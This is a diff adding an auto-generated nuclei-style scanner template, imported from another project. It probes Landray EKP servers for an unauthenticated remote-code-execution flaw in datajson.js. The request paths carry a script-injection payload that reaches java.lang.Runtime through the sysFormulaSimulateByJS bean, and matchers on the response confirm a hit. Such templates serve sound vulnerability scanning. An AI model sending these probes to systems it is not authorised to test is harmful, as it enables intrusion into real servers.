@@ -1,0 +1,25 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-landray-unauth_rce_datajson
+info:
+  name: "Landray unauth_rce_datajson"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, landray, ref-poc, rce]
+  description: "由参考项目脚本静态导入：Landray/unauth_rce_datajson（类型 RCE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){return java.lang.Runtime};"
+      - "/ekp"
+      - "/ekp/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){return java.lang.Runtime};"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "sys/ui/extend/theme/default/style/profile.css"
+          - "sys/ui/extend/theme/default/style/icon.css"
